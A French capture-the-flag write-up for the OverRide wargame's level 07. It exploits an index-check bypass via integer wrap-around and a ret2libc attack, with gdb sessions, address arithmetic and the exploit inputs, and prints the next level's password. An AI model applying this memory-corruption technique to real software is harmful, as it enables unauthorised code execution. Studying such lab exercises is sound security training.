# Level 07

On remarque des commandes store, read et quit. Plusieurs essaies nous permettent de voir que l'on peut mettre des nombres négatif afin d'écrire à la fin du buffer et que certaines adresses appartiennent à wil. On pense directement à déterminer l'adresse de retour du main afin d'y mettre un shellcode ou de faire un ret2libc. Il se trouve que le programme supprime les variables d'environements. On décide d'utiliser la méthode du ret2libc car elle nous semble plus simple à mettre en oeuvre.

```bash
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil\'s crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 42
 Index: 42
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command: store
 Number: 42
 Index: 2
 Completed store command successfully
Input command: read   
 Index: 42
 Number at data[42] is 0
 Completed read command successfully
Input command: store
 Number: 42
 Index: -5
 Completed store command successfully
Input command: read
 Index: -5
 Number at data[4294967291] is 42
 Completed read command successfully

```

On identifie le début et la fin du buffer ainsi que sa taille.

```
...
0x08048791 <+110>:	lea    0x24(%esp),%ebx
...
Breakpoint 1, 0x08048882 in main ()       <-- adresse de l'apel de fgets dans le main
(gdb) info r
(gdb) x/x $esp+0x24
0xffffd544:	0x00000000                    <-- Début du buffer
(gdb) info r eax
eax            0xffffd6d8	-10536          <-- FIN buffer
>>> 0xffffd6d8 - 0xffffd544               <-- Fin du buffer - Début buffer
404                                       <-- La taille du buffer est de 100
```

On identifie l'adresse de eip, de system ainsi que de "/bin/sh".

```bash
(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr

(gdb) find &system, +9999999, "/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.

(gdb) i f
Stack level 0, frame at 0xffffd710:
 eip = 0x8048882 in main; saved eip 0xf7e45513
 Arglist at 0xffffd708, args: 
 Locals at 0xffffd708, Previous frame\'s sp is 0xffffd710
 Saved registers:
  ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704,
  eip at 0xffffd70c
```

L'adresse 114 appartient à wil. On utilise un overflow pour acceder à cet endroit avec un moyen différent.

```python
>>> 0xf7e6aed0                <-- system
4159090384
>>> 0xf7f897ec                <-- "/bin/sh"
4160264172
>>> 0xffffd70c - 0xffffd544   <-- adresse de retour du main - Début du buffer
456
>>> 456 / 4
114
>>> (4294967296 / 4) + 114
1073741938                    <-- égal à 114 avec un décalage binaire dû à un overflow
```

On utilise un ret2lic pour nous permettre de lancer un bash afin d'avoir le flag. On se sert des commandes stores et quit.

```bash
----------------------------------------------------
  Welcome to wil\'s crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------
Input command: store      
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
